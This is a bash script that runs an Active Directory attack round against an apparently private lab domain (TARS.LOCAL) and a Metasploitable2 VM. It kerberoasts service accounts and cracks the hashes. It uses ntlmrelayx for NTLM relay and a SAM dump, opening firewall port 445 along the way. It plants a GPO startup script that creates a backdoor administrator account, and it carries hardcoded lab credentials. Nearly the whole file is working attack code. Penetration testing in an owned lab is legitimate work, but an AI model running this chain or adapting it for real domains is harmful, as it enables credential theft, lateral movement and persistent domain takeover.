#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — ROUND 4 (final) — TARS.LOCAL 2026-08-09
# R1 kerberoast con script REALMENTE parcheado + trace diagnostico si falla
# R2 relay: debug firewall/listener + RELAY WIN a metasploitable2 (SAM dump)
#    + relay -> DC SMB (signing block)
# R3 GPO payload via smbclient (rutas relativas) + verify + cleanup
# R4 cleanup
# =============================================================================
set -u
DC=192.168.122.50
REALM=TARS.LOCAL
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
SKILLDIR=/opt/ad-lab/suite-ad-real
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1
GUID='{40B48ABF-204C-4FF6-8576-F75F531FFF77}'
TS(){ date +%H:%M:%S; }
SSH_DC="sshpass -p TarsLab2026! ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 root@$DC"
echo "[$(TS)] ============ ROUND 4 START ============"

# ---------- R1 kerberoast (script parcheado de verdad) ----------
echo "[$(TS)] === R1 kerberoast ==="
chmod +x $SKILLDIR/*.sh $SKILLDIR/*.py
timeout 240 $SKILLDIR/samba-kerberoast.sh $DC $REALM "$ADMIN" "$ADMPW" \
  MSSQLSvc/dc01.tars.local:1433 CIFS/backup.tars.local HTTP/app.tars.local HTTP/web.tars.local \
  2>&1 | tee "$OUT/02-kerberoast-hashes.txt"; echo "rc=$?"
grep '^\$krb5tgs\$' "$OUT/02-kerberoast-hashes.txt" > "$OUT/02-kerb.hashes" 2>/dev/null || true
N=$(wc -l < "$OUT/02-kerb.hashes")
echo "[$(TS)] TGS hashes: $N"
if [ "$N" = "0" ]; then
  echo "[$(TS)] diagnostico KRB5_TRACE:"
  cat > /tmp/krb5-diag.conf <<EOF
[libdefaults]
    default_realm = TARS.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    allow_weak_crypto = true
    default_tkt_enctypes = arcfour-hmac-md5
    default_tgs_enctypes = arcfour-hmac-md5
[realms]
    TARS.LOCAL = {
        kdc = 192.168.122.50
    }
[domain_realm]
    .tars.local = TARS.LOCAL
    tars.local = TARS.LOCAL
EOF
  echo "--- conf usada por el script (en GEEKOM):"
  cat /tmp/krb5-TARS.LOCAL.conf 2>/dev/null | tee "$OUT/02-krb5-conf.txt"
  KRB5_CONFIG=/tmp/krb5-diag.conf KRB5_TRACE=/tmp/krb5-trace.txt timeout 20 bash -c "printf '%s' 'TarsLab2026!' | kinit Administrator@TARS.LOCAL" 2>&1 | tee -a "$OUT/02-kerberoast-hashes.txt"
  tail -20 /tmp/krb5-trace.txt 2>/dev/null | tee "$OUT/02-krb5-trace.txt"
fi
if [ -s "$OUT/02-kerb.hashes" ]; then
  timeout 300 $VENV/python3 $SKILLDIR/crack-krb5tgs-rc4.py "$OUT/02-kerb.hashes" /tmp/wordlist-lab.txt 2>&1 | tee "$OUT/04-kerb-crack.txt"
fi

# ---------- R2 metasploitable2 + relay ----------
echo "[$(TS)] === R2 metasploitable2 boot + relay win ==="
virsh start metasploitable2 2>&1 | head -2
META_IP=""
for i in $(seq 1 18); do
  sleep 10
  META_MAC=$(virsh dumpxml metasploitable2 2>/dev/null | grep -oE 'mac address="[0-9a-f:]+"' | cut -d'"' -f2)
  META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk -v m="$META_MAC" 'toupper($2)==toupper(m){print $5}' | head -1)
  [ -n "$META_IP" ] && break
done
echo "[$(TS)] metasploitable2 IP=${META_IP:-NONE}"
if [ -n "$META_IP" ]; then
  echo "$META_IP" > "$OUT/08a-meta-ip.txt"
  timeout 20 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"
  echo "[$(TS)] --- debug listener/firewall:"
  echo "firewalld=$(systemctl is-active firewalld 2>&1)" | tee "$OUT/08b-firewall.txt"
  ss -ltn | grep ':445 ' | tee -a "$OUT/08b-firewall.txt" || echo "445 no escuchando aun" >> "$OUT/08b-firewall.txt"
  $VENV/ntlmrelayx.py -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
  RELAYPID=$!
  sleep 7
  ss -ltn | grep ':445 ' | tee -a "$OUT/08b-firewall.txt"
  nc -zvw3 $HOST_IP 445 2>&1 | tee -a "$OUT/08b-firewall.txt"
  if ! nc -zvw3 $HOST_IP 445 >/dev/null 2>&1; then
    echo "[$(TS)] 445 bloqueado — abriendo (iptables directo)"
    iptables -I INPUT -p tcp --dport 445 -j ACCEPT 2>&1 | tee -a "$OUT/08b-firewall.txt"
    firewall-cmd --add-port=445/tcp 2>&1 | tee -a "$OUT/08b-firewall.txt"
    sleep 2
    nc -zvw3 $HOST_IP 445 2>&1 | tee -a "$OUT/08b-firewall.txt"
  fi
  echo "[$(TS)] --- RELAY WIN trigger (Administrator -> listener -> metasploitable2):"
  timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08c-trigger-smbclient.txt"
  sleep 15
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -iE "authenticated|dumping|sam|share|nt_status|session|attempting|error|wrote|smb-|target" "$OUT/08-relayx-meta.log" | head -40 | tee "$OUT/08d-relay-meta-result.txt"
  echo "[$(TS)] loot:"; ls -la "$OUT/relay-loot-meta/" 2>/dev/null | head -8 | tee -a "$OUT/08d-relay-meta-result.txt"
fi

# ---------- R2b relay -> DC SMB (signing) ----------
echo "[$(TS)] === R2b relay Administrator -> DC SMB ==="
$VENV/ntlmrelayx.py -t "smb://$DC" -smb2support -l "$OUT/relay-loot-dcsmb" >"$OUT/08-relayx-dcsmb.log" 2>&1 &
RELAYPID=$!
sleep 7
timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08h-trigger-dcsmb.txt"
sleep 15
kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
grep -iE "authenticated|dumping|sam|nt_status|session|attempting|error|signing|refus|accept|target|smb-" "$OUT/08-relayx-dcsmb.log" | head -25 | tee "$OUT/08i-relay-dcsmb-result.txt"

# ---------- R3 GPO payload (rutas relativas) ----------
echo "[$(TS)] === R3 GPO payload upload ==="
mkdir -p /tmp/gpofiles
printf '@echo off\r\nnet user gpo_pwn Pwned2026! /add\r\nnet localgroup Administrators gpo_pwn /add\r\n' > /tmp/gpofiles/startup.cmd
printf '[Startup]\r\n0CmdLine=startup.cmd\r\n0Parameters=\r\n' > /tmp/gpofiles/scripts.ini
printf '[General]\r\nVersion=2\r\ngPCMachineExtensionNames=[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]\r\n' > /tmp/gpofiles/gpt.ini
cd /tmp/gpofiles
smbclient //$DC/sysvol -U "$ADMIN%$ADMPW" -c "cd tars.local/Policies/$GUID/Machine/Scripts/Startup; put startup.cmd; put scripts.ini; ls; cd ../../..; put gpt.ini; ls" 2>&1 | tee "$OUT/09e-sysvol-write.txt"; echo "rc=$?"
echo "[$(TS)] --- verify:"
$SSH_DC "rmdir /var/lib/samba/sysvol/Startup 2>/dev/null; echo '--- arbol ---'; find /var/lib/samba/sysvol/tars.local/Policies/$GUID -type f | sort; echo '--- startup.cmd ---'; cat '/var/lib/samba/sysvol/tars.local/Policies/$GUID/Machine/Scripts/Startup/startup.cmd'; echo; echo '--- gpt.ini ---'; cat '/var/lib/samba/sysvol/tars.local/Policies/$GUID/gpt.ini'; echo; echo '--- gpo show ---'; samba-tool gpo show '$GUID' 2>&1 | grep -viE 'debug_lookup|GENSEC|Starting|temporary|^$'; echo '--- links ---'; samba-tool gpo getlink 'DC=tars,DC=local' 2>&1 | grep -viE 'debug_lookup|GENSEC|Starting|temporary|^$'" | tee "$OUT/09f-gpo-verify.txt"

# ---------- R4 cleanup ----------
echo "[$(TS)] === R4 cleanup ==="
iptables -D INPUT -p tcp --dport 445 -j ACCEPT 2>/dev/null
firewall-cmd --remove-port=445/tcp >/dev/null 2>&1
virsh shutdown metasploitable2 2>&1 | head -1
echo "[$(TS)] ============ ROUND 4 DONE ============"
